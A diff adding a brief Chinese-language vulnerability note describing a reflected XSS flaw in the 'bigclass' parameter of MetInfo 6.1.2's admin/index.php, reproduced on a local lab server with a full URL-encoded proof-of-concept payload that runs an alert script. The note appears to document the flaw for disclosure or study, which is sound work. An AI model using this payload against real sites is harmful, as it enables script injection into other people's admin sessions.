@@ -1,0 +1,5 @@
+#### 漏洞概述  
+
+> 漏洞存在于MetInfo6.1.2/admin/index.php页面，由于参数bigclass过滤不严，导致XSS漏洞
+本地搭建网站，首先登录网站后台:`http://172.16.141.134/MetInfo6.1.2/admin/`，登录成功后，构造payload：
+`http://172.16.141.134/MetInfo6.1.2/admin/index.php?lang=cn&anyid=25&n=column&c=index&a=doadd&bigclass=1%22%3e%3cscript%3ealert(/xss/)%3c%2fscript%3e` ，即可执行跨站脚本。  
